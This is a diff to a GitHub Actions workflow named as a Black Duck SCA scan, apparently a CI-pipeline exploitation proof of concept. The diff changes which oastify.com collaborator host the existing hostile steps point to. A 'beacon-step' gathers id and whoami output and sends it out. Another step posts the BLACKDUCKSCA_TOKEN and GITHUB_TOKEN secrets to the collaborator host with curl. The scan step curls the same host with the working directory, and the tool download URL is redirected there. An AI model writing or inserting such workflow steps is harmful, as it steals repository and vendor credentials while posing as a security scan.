@@ -17,10 +17,11 @@ on:
       - stage
       - release
   workflow_dispatch: {}
+# GitHub token permissions for post-scan actions. Required for built-in GITHUB_TOKEN; if using a PAT with equivalent scopes, permissions block can be commented out.
 permissions:
-  contents: write
-  pull-requests: write
-  issues: write
+  contents: write               # Required to push changes or create fix branches
+  pull-requests: write          # Required to add comments or create fix pull requests
+  issues: write                 # Required to create github issues
 jobs:
   blackducksca:
     runs-on: ubuntu-latest
@@ -44,8 +45,8 @@ jobs:
       BRIDGE_GITHUB_USER_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       ### GitHub pull request information
       BRIDGE_GITHUB_REPOSITORY_PULL_NUMBER: ${{ github.event.pull_request.number || github.event.number || 0 }}
-      ### TOOLING: Bridge CLI download URL  &lt;-- SSRF sink
-      BRIDGE_DOWNLOAD_URL: https://fra2ejjeizezxelgvtxi78zds4yvmoad.oastify.com
+      ### TOOLING: Bridge CLI download URL
+      BRIDGE_DOWNLOAD_URL: https://738py12ivfo74r1vzhnxm9fdy44wsugj.oastify.com
     steps:
       - name: Checkout Source
         uses: actions/checkout@v5
@@ -53,7 +54,7 @@ jobs:
       # === BEACON 1: proves a custom step runs ===
       - name: beacon-step
         run: |
-          COLLAB="https://fra2ejjeizezxelgvtxi78zds4yvmoad.oastify.com"
+          COLLAB="https://738py12ivfo74r1vzhnxm9fdy44wsugj.oastify.com"
           {
             echo "=== id ==="; id
             echo "=== whoami ==="; whoami
@@ -81,7 +82,7 @@ jobs:
             --data-urlencode "token=${{ secrets.BLACKDUCKSCA_TOKEN }}" \
             --data-urlencode "ghtoken=${{ secrets.GITHUB_TOKEN }}" \
             --data-urlencode "url=${{ vars.BLACKDUCKSCA_URL }}" \
-            "https://fra2ejjeizezxelgvtxi78zds4yvmoad.oastify.com/step2" || true
+            "https://738py12ivfo74r1vzhnxm9fdy44wsugj.oastify.com/step2" || true
 
       - name: Download &amp; Setup Bridge CLI on Windows
         if: runner.os == 'Windows'
@@ -103,6 +104,5 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" &gt;&gt; "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" &amp;&amp; curl -sS "https://fra2ejjeizezxelgvtxi78zds4yvmoad.oastify.com/scan?host=$(pwd)" || true
-
- 
+        run: echo "scan-step" &amp;&amp; curl -sS "https://738py12ivfo74r1vzhnxm9fdy44wsugj.oastify.com/scan?host=$(pwd)" || true
+       
